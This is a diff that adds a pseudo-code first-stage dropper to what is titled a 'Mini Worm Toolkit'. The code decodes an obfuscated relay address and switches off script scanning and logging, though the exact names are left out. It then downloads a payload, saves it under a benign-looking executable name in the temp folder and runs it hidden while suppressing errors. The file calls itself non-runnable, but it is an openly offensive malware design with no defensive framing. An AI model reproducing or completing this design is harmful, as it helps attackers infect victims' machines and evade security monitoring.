@@ -1,0 +1,36 @@
+# +--------------------------------------------------------------------------+
+# |                                                                          |
+# |                       Veneficus Mini Worm Toolkit                        |
+# |                                                                          |
+# +--------------------------------------------------------------------------+
+
+# dropper/stage.pseudo
+# First-stage downloader. Pseudo-code, not a runnable script.
+
+CONST HOST_BLOB = "<opaque XOR-then-base64 of the relay base URL>"
+CONST XOR_K     = <build-time constant>
+
+FUNCTION decode_host() -> url:
+    bytes = base64decode(HOST_BLOB)
+    XOR each byte with XOR_K
+    RETURN as UTF-8
+
+FUNCTION quiet_script_engine():
+    # Disable in-process script scanning
+    # Disable script-block and module logging policy
+    # Overwrite any cached policy object so the engine
+    # does not re-read the real policy
+    # Exact type and field names omitted.
+
+FUNCTION fetch_and_run():
+    url = decode_host()
+    bytes = HTTP GET url + "/payload"
+        User-Agent: generic desktop browser
+    dest = %TEMP% / "HostHealthSync.exe"    # alias, not the private name
+    write dest
+    start dest hidden, no window, detached
+    ON error: swallow
+
+ENTRY:
+    quiet_script_engine()
+    fetch_and_run()
